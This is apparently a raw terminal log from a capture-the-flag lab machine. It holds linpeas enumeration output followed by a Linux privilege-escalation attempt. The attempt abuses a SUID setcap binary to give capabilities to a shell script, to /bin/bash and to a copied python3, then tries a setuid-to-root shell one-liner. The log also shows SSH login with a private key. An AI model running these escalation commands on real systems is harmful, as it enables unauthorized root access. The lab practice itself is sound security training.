#)You_can_write_even_more_files_inside_last_directory

/tmp/anydesk



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                           
                            ╚═════════════════════════╝                                                                       
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                    
/usr/bin/gettext.sh                                                                                                           

╔══════════╣ Executable files potentially added by user (limit 70)
2022-05-14+16:28:36.5677765520 /etc/rc.local                                                                                  
2022-03-23+13:26:55.6500796510 /home/annie/.anydesk.sh
2022-03-23+13:21:36.5844658740 /etc/console-setup/cached_setup_terminal.sh
2022-03-23+13:21:36.5844658740 /etc/console-setup/cached_setup_keyboard.sh
2022-03-23+13:21:36.5844658740 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in root
/swapfile                                                                                                                     
/vmlinuz
/initrd.img
/initrd.img.old
/vmlinuz.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/kern.log                                                                                                             
/var/log/auth.log
/var/log/anydesk.trace
/var/log/syslog
/var/log/journal/9035659da70a4b8ebcd6691cfa3ab648/user-1000.journal
/var/log/journal/9035659da70a4b8ebcd6691cfa3ab648/system.journal
/home/annie/.anydesk/anydesk.trace
/home/annie/.dbus/session-bus/9035659da70a4b8ebcd6691cfa3ab648-10
/etc/anydesk/system.conf
/etc/xdg/autostart/anydesk_global_tray.desktop

logrotate 3.11.0

╔══════════╣ Files inside /home/annie (limit 20)
total 944                                                                                                                     
drwxr-xr-x 17 annie annie   4096 Jun 18 07:10 .
drwxr-xr-x  3 root  root    4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie   4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie     41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie      9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie    220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie   3771 Mar 23  2022 .bashrc
drwx------  8 annie annie   4096 Mar 23  2022 .cache
drwx------  9 annie annie   4096 Mar 23  2022 .config
drwx------  3 annie annie   4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Downloads
drwx------  3 annie annie   4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie    640 Mar 23  2022 .ICEauthority
-rw-------  1 annie annie     32 Jun 18 06:03 .lesshst
-rw-rw-r--  1 annie annie 860323 Apr 23 06:12 linpeas.sh
drwx------  3 annie annie   4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie    807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Public

╔══════════╣ Files inside others home (limit 20)
                                                                                                                              
╔══════════╣ Searching installed mail applications
                                                                                                                              
╔══════════╣ Mails (limit 50)
                                                                                                                              
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 9081 Mar 18  2022 /lib/modules/4.15.0-173-generic/kernel/drivers/power/supply/wm831x_backup.ko         
-rw-r--r-- 1 root root 8881 Mar 18  2022 /lib/modules/4.15.0-173-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7857 Jan 17  2020 /lib/modules/4.15.0-76-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Jan 17  2020 /lib/modules/4.15.0-76-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 annie annie 22632 Mar 23  2022 /home/annie/.local/share/xorg/Xorg.1.log.old
-rw-r--r-- 1 root root 13940 Mar 23  2022 /usr/share/info/dir.old
-rw-r--r-- 1 root root 1320 Apr 15  2018 /usr/share/help/C/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1262 Apr 15  2018 /usr/share/help/C/gnome-help/backup-why.page
-rw-r--r-- 1 root root 3318 Apr 15  2018 /usr/share/help/C/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2505 Apr 15  2018 /usr/share/help/C/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1815 Apr 15  2018 /usr/share/help/C/gnome-help/backup-check.page
-rw-r--r-- 1 root root 1999 Apr 15  2018 /usr/share/help/C/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2268 Apr 15  2018 /usr/share/help/C/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2356 Apr 15  2018 /usr/share/help/C/gnome-help/backup-how.page
-rw-r--r-- 1 root root 361345 Feb  1  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 1513 Oct 19  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 3026 Mar 23  2022 /etc/apt/sources.bak

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /home/annie/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/mlocate/mlocate.db: regular file, no read permission
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3022000

 -> Extracting tables from /home/annie/.local/share/evolution/addressbook/system/contacts.db (limit 20)
  --> Found interesting column names in folder_id_email_list (output limit 10)                                                
CREATE TABLE 'folder_id_email_list' (uid TEXT NOT NULL REFERENCES 'folder_id' (uid), value TEXT)                              

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)                                                              
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)                                                     
                                                                                                                              
╔══════════╣ Web files?(output limit)
                                                                                                                              
╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 gdm gdm 0 Mar 23  2022 /var/lib/gdm3/.anydesk/.anydesk.trace                                                     
-rw------- 1 gdm gdm 13416 Jun 18 04:10 /var/lib/gdm3/.ICEauthority
-rw-r--r-- 1 annie annie 220 Mar 23  2022 /home/annie/.bash_logout
-rw-r--r-- 1 annie annie 0 Mar 23  2022 /home/annie/.anydesk/.anydesk.trace
-rwxrwxr-x 1 annie annie 41 Mar 23  2022 /home/annie/.anydesk.sh
-rw-r--r-- 1 root root 66 Mar 23  2022 /home/annie/.selected_editor
-rw------- 1 annie annie 640 Mar 23  2022 /home/annie/.ICEauthority
-r--r--r-- 1 gdm gdm 11 Jun 18 04:10 /tmp/.X1024-lock
-r--r--r-- 1 root root 11 Jun 18 04:07 /tmp/.X10-lock
-rw-r--r-- 1 root root 1531 Mar 23  2022 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Feb  3  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                                       
-r--r--r-- 1 gdm gdm 11 Jun 18 04:10 /tmp/.X1024-lock                                                                         
-r--r--r-- 1 root root 11 Jun 18 04:07 /tmp/.X10-lock
-rw-r--r-- 1 root root 6 Mar 23  2022 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 51200 Jun 18 06:25 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
                                                                                                                              
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                     
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/usr/lib/evolution-data-server/credential-modules
/usr/lib/evolution-data-server/credential-modules/module-credentials-goa.so
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/pppd/2.4.7/passwordfd.so
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/help/bg/zenity/figures/zenity-password-screenshot.png
/usr/share/help/bg/zenity/password.page
/usr/share/help/ca/zenity/figures/zenity-password-screenshot.png
/usr/share/help/ca/zenity/password.page
/usr/share/help/C/gnome-help/user-changepassword.page
/usr/share/help/C/gnome-help/user-goodpassword.page
/usr/share/help/cs/zenity/figures/zenity-password-screenshot.png
/usr/share/help/cs/zenity/password.page
/usr/share/help/C/zenity/figures/zenity-password-screenshot.png
/usr/share/help/C/zenity/password.page
/usr/share/help/da/zenity/figures/zenity-password-screenshot.png
/usr/share/help/da/zenity/password.page
/usr/share/help/de/zenity/figures/zenity-password-screenshot.png
/usr/share/help/de/zenity/password.page
/usr/share/help/el/zenity/figures/zenity-password-screenshot.png
/usr/share/help/el/zenity/password.page
/usr/share/help/en_GB/zenity/figures/zenity-password-screenshot.png
/usr/share/help/en_GB/zenity/password.page
/usr/share/help/es/zenity/figures/zenity-password-screenshot.png
/usr/share/help/es/zenity/password.page
/usr/share/help/eu/zenity/figures/zenity-password-screenshot.png
/usr/share/help/eu/zenity/password.page
/usr/share/help/fi/zenity/figures/zenity-password-screenshot.png
/usr/share/help/fi/zenity/password.page
/usr/share/help/fr/zenity/figures/zenity-password-screenshot.png
/usr/share/help/fr/zenity/password.page
/usr/share/help/gl/zenity/figures/zenity-password-screenshot.png
/usr/share/help/gl/zenity/password.page
/usr/share/help/hu/zenity/figures/zenity-password-screenshot.png
/usr/share/help/hu/zenity/password.page
/usr/share/help/ja/zenity/figures/zenity-password-screenshot.png
/usr/share/help/ja/zenity/password.page
/usr/share/help/oc/zenity/figures/zenity-password-screenshot.png
/usr/share/help/oc/zenity/password.page
/usr/share/help/pl/zenity/figures/zenity-password-screenshot.png
/usr/share/help/pl/zenity/password.page
/usr/share/help/pt_BR/zenity/figures/zenity-password-screenshot.png
/usr/share/help/pt_BR/zenity/password.page
/usr/share/help/ru/zenity/figures/zenity-password-screenshot.png
/usr/share/help/ru/zenity/password.page
/usr/share/help/sl/zenity/figures/zenity-password-screenshot.png
/usr/share/help/sl/zenity/password.page
/usr/share/help/sv/zenity/figures/zenity-password-screenshot.png
/usr/share/help/sv/zenity/password.page
/usr/share/help/uk/zenity/figures/zenity-password-screenshot.png

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                              
╔══════════╣ Searching passwords inside logs (limit 70)
 Argon2 is a password-hashing function that can be used to hash passwords                                                     
Binary file /var/log/journal/9035659da70a4b8ebcd6691cfa3ab648/user-1000.journal matches
Description: Set up users and passwords



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                            
                                ╚════════════════╝                                                                            
Regexes to search for API keys aren't activated, use param '-r' 


annie@desktop:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/setcap
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
annie@desktop:~$ find / -perm -u=s -type f -exec la -la {} + 2>/dev/null|cat
annie@desktop:~$ find / -perm -u=s -type f -exec la -la {} + 2>/dev/null
annie@desktop:~$ find / -perm -u=s -type f -exec la -la {} ; 2>/dev/null
find: missing argument to `-exec'
annie@desktop:~$ find / -perm -u=s -type f -exec ls -la {} + 2>/dev/null
-rwsr-xr-x 1 root root        30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root        43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root        64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root        44664 Jan 25  2022 /bin/su
-rwsr-xr-x 1 root root        26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root        10232 Nov 16  2017 /sbin/setcap
-rwsr-xr-x 1 root root        22528 Jun 28  2019 /usr/bin/arping
-rwsr-xr-x 1 root root        76496 Jan 25  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root        44528 Jan 25  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root        75824 Jan 25  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        40344 Jan 25  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root        59640 Jan 25  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root        22520 Jan 12  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root       149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root messagebus  42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root        10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip        378600 Jul 23  2020 /usr/sbin/pppd
annie@desktop:~$ find / -perm -u=s -type f -exec ls -la {} + 2>/dev/null-rwsr-xr-x 1 root root        10232 Nov 16  2017 /sbin/setcap
-bash: /dev/null-rwsr-xr-x: Permission denied
annie@desktop:~$ echo '#!/bin/bash' > /tmp/root_shell.sh
annie@desktop:~$ echo 'bash' >> /tmp/root_shell.sh
annie@desktop:~$ chmod +x /tmp/root_shell.sh
annie@desktop:~$ ls -la
total 944
drwxr-xr-x 17 annie annie   4096 Jun 18 07:10 .
drwxr-xr-x  3 root  root    4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie   4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie     41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie      9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie    220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie   3771 Mar 23  2022 .bashrc
drwx------  8 annie annie   4096 Mar 23  2022 .cache
drwx------  9 annie annie   4096 Mar 23  2022 .config
drwx------  3 annie annie   4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Downloads
drwx------  3 annie annie   4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie    640 Mar 23  2022 .ICEauthority
-rw-------  1 annie annie     32 Jun 18 06:03 .lesshst
-rw-rw-r--  1 annie annie 860323 Apr 23 06:12 linpeas.sh
drwx------  3 annie annie   4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie    807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Public
-rw-r--r--  1 root  root      66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie      0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie     23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Videos
annie@desktop:~$ cat anls -la /tmp
cat: invalid option -- 'l'
Try 'cat --help' for more information.
annie@desktop:~$ ls -la /tmp
total 184
drwxrwxrwt 14 root  root    4096 Jun 18 09:03 .
drwxr-xr-x 22 root  root    4096 Mar 23  2022 ..
drwxrwxrwx  2 annie annie 118784 Jun 18 09:03 anydesk
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .font-unix
drwxrwxrwt  2 root  root    4096 Jun 18 04:10 .ICE-unix
-rwxrwxr-x  1 annie annie     17 Jun 18 09:02 root_shell.sh
drwx------  3 root  root    4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-bolt.service-D8DPhg
drwx------  3 root  root    4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-colord.service-j2iDBl
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-ModemManager.service-0HgELQ
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-rtkit-daemon.service-JWCwML
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-resolved.service-RpUcmG
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-timesyncd.service-fC1O3e                                                                                                                             
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .Test-unix
-r--r--r--  1 gdm   gdm       11 Jun 18 04:10 .X1024-lock
-r--r--r--  1 root  root      11 Jun 18 04:07 .X10-lock
drwxrwxrwt  2 root  root    4096 Jun 18 04:10 .X11-unix
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .XIM-unix
annie@desktop:~$ cd /tmp
annie@desktop:/tmp$ ls -la
total 184
drwxrwxrwt 14 root  root    4096 Jun 18 09:03 .
drwxr-xr-x 22 root  root    4096 Mar 23  2022 ..
drwxrwxrwx  2 annie annie 118784 Jun 18 09:03 anydesk
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .font-unix
drwxrwxrwt  2 root  root    4096 Jun 18 04:10 .ICE-unix
-rwxrwxr-x  1 annie annie     17 Jun 18 09:02 root_shell.sh
drwx------  3 root  root    4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-bolt.service-D8DPhg
drwx------  3 root  root    4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-colord.service-j2iDBl
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-ModemManager.service-0HgELQ
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-rtkit-daemon.service-JWCwML
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-resolved.service-RpUcmG
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-timesyncd.service-fC1O3e                                                                                                                             
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .Test-unix
-r--r--r--  1 gdm   gdm       11 Jun 18 04:10 .X1024-lock
-r--r--r--  1 root  root      11 Jun 18 04:07 .X10-lock
drwxrwxrwt  2 root  root    4096 Jun 18 04:10 .X11-unix
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .XIM-unix
annie@desktop:/tmp$ ls -la
total 184
drwxrwxrwt 14 root  root    4096 Jun 18 09:03 .
drwxr-xr-x 22 root  root    4096 Mar 23  2022 ..
drwxrwxrwx  2 annie annie 118784 Jun 18 09:03 anydesk
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .font-unix
drwxrwxrwt  2 root  root    4096 Jun 18 04:10 .ICE-unix
-rwxrwxr-x  1 annie annie     17 Jun 18 09:02 root_shell.sh
drwx------  3 root  root    4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-bolt.service-D8DPhg
drwx------  3 root  root    4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-colord.service-j2iDBl
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-ModemManager.service-0HgELQ
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-rtkit-daemon.service-JWCwML
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-resolved.service-RpUcmG
drwx------  3 root  root    4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-timesyncd.service-fC1O3e                                                                                                                             
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .Test-unix
-r--r--r--  1 gdm   gdm       11 Jun 18 04:10 .X1024-lock
-r--r--r--  1 root  root      11 Jun 18 04:07 .X10-lock
drwxrwxrwt  2 root  root    4096 Jun 18 04:10 .X11-unix
drwxrwxrwt  2 root  root    4096 Jun 18 04:07 .XIM-unix
annie@desktop:/tmp$ which setcap
/sbin/setcap
annie@desktop:/tmp$ /ls -la /sbin/setcap
-bash: /ls: No such file or directory
annie@desktop:/tmp$ ls -la /sbin/setcap
-rwsr-xr-x 1 root root 10232 Nov 16  2017 /sbin/setcap
annie@desktop:/tmp$ /sbin/setcap cap_setuid+ep /tmp/root_shell.sh 
annie@desktop:/tmp$ ls -la root_shell.sh 
-rwxrwxr-x 1 annie annie 17 Jun 18 09:02 root_shell.sh
annie@desktop:/tmp$ getcap -r / 2>/dev/null
/tmp/root_shell.sh = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
annie@desktop:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
annie@desktop:/tmp$ /sbin/setcap cap_setuid,cap_setgid+ep /bin/bash
annie@desktop:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
annie@desktop:/tmp$ /bin/bash -p
annie@desktop:/tmp$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
annie@desktop:/tmp$ -rwsr-xr-- 1 root dip 370K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
bash: syntax error near unexpected token `('
annie@desktop:/tmp$ find / -type f -user root -group <your-group> -perm -g=w -exec ls -l {} + 2> /dev/null|cat
bash: your-group: No such file or directory
annie@desktop:/tmp$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
annie@desktop:/tmp$ find / -type f -user root -group annie -perm -g=w -exec ls -l {} + 2> /dev/null|cat
annie@desktop:/tmp$ find / -type f -user root -group cdrom -perm -g=w -exec ls -l {} + 2> /dev/null|cat
annie@desktop:/tmp$ find / -type f -user root -group sudo -perm -g=w -exec ls -l {} + 2> /dev/null|cat
annie@desktop:/tmp$ find / -type f -user root -group dip -perm -g=w -exec ls -l {} + 2> /dev/null|cat
annie@desktop:/tmp$ find / -type f -user root -group plugdev -perm -g=w -exec ls -l {} + 2> /dev/null|cat
annie@desktop:/tmp$ find / -type f -user root -group lpadmin -perm -g=w -exec ls -l {} + 2> /dev/null|cat
annie@desktop:/tmp$ find / -type f -user root -group sambashare -perm -g=w -exec ls -l {} + 2> /dev/null|cat
annie@desktop:/tmp$ find / -type f -user root -group dip -perm -u=w -exec ls -l {} + 2> /dev/null|cat
-rw-r----- 1 root dip    656 Mar 23  2022 /etc/chatscripts/provider
-rw-r----- 1 root dip   1093 Mar 23  2022 /etc/ppp/peers/provider
-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd
annie@desktop:/tmp$ find / -type f -user root -group dip -perm -u=Connection to 10.10.159.237 closed by remote host.
Connection to 10.10.159.237 closed.
                                                                                                                              
┌──(kali㉿kali)-[~/thm/annie]
└─$ ssh annie@10.10.172.49 -i ./id_rsa
The authenticity of host '10.10.172.49 (10.10.172.49)' can't be established.
ED25519 key fingerprint is SHA256:psjvqDXPWOqLQKlK8kRzSuqVtvSrfysL/TwPGnhb2Jw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:59: [hashed name]
    ~/.ssh/known_hosts:60: [hashed name]
    ~/.ssh/known_hosts:61: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.172.49' (ED25519) to the list of known hosts.
Enter passphrase for key './id_rsa': 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-173-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat May 14 16:03:44 2022 from 192.168.58.128
annie@desktop:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
annie@desktop:~$ ls -la /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
-rwxr-xr-x 1 root root 18632 Apr 19  2021 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
annie@desktop:~$ ^C
annie@desktop:~$ ls -la /usr/bin/mtr-packet
-rwxr-xr-x 1 root root 26616 Nov  1  2017 /usr/bin/mtr-packet
annie@desktop:~$ ls -la /usr/bin/gnome-keyring-daemon
-rwxr-xr-x 1 root root 1094560 May  9  2018 /usr/bin/gnome-keyring-daemon
annie@desktop:~$ cp /bin/python3 .
cp: cannot stat '/bin/python3': No such file or directory
annie@desktop:~$ cp /usr/bin/python3 .
annie@desktop:~$ ls -la
total 4520
drwxr-xr-x 17 annie annie    4096 Jun 18 10:27 .
drwxr-xr-x  3 root  root     4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie    4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie      41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie       9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie     220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie    3771 Mar 23  2022 .bashrc
drwx------  8 annie annie    4096 Mar 23  2022 .cache
drwx------  9 annie annie    4096 Mar 23  2022 .config
drwx------  3 annie annie    4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Downloads
drwx------  3 annie annie    4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie     640 Mar 23  2022 .ICEauthority
drwx------  3 annie annie    4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie     807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Public
-rwxr-xr-x  1 annie annie 4526456 Jun 18 10:27 python3
-rw-r--r--  1 root  root       66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie       0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie      23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Videos
annie@desktop:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
annie@desktop:~$ pwd
/home/annie
annie@desktop:~$ ls -al python3
-rwxr-xr-x 1 annie annie 4526456 Jun 18 10:27 python3
annie@desktop:~$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
annie@desktop:~$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
annie@desktop:~$ ls -la
total 4520
drwxr-xr-x 17 annie annie    4096 Jun 18 10:27 .
drwxr-xr-x  3 root  root     4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie    4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie      41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie       9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie     220 Mar 23  2022 .bash_logout
